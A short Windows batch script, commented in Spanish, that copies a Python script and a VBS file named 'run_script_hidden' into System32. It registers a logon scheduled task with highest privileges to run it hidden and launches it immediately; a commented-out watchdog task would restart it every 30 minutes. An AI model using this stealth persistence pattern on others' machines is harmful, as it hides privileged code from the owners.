@echo off
REM Copiar el archivo Python a C:\Windows\System32
copy /Y "%~dp0SCRIPTLABA.py" "C:\Windows\System32\SCRIPTLABA.py"

REM Copiar el archivo VBS a C:\Windows\System32
copy /Y "%~dp0run_script_hidden.vbs" "C:\Windows\System32\run_script_hidden.vbs"

REM Crear una tarea programada para ejecutar el archivo VBS al iniciar sesión
schtasks /create /tn "RunScriptLaba_OnLogon" /tr "wscript C:\Windows\System32\run_script_hidden.vbs" /sc onlogon /f /rl highest

REM Crear una tarea programada para verificar cada 30 minutos que la tarea principal esté ejecutándose
REM schtasks /create /tn "MonitorRunScriptLaba" /tr "cmd /c tasklist /fi \"imagename eq wscript.exe\" | findstr /i run_script_hidden.vbs || schtasks /run /tn RunScriptLaba_OnLogon" /sc minute /mo 30 /f /rl highest

REM Ejecutar la tarea programada principal inmediatamente
schtasks /run /tn "RunScriptLaba_OnLogon"

echo Tareas programadas creadas y ejecutadas exitosamente.
pause
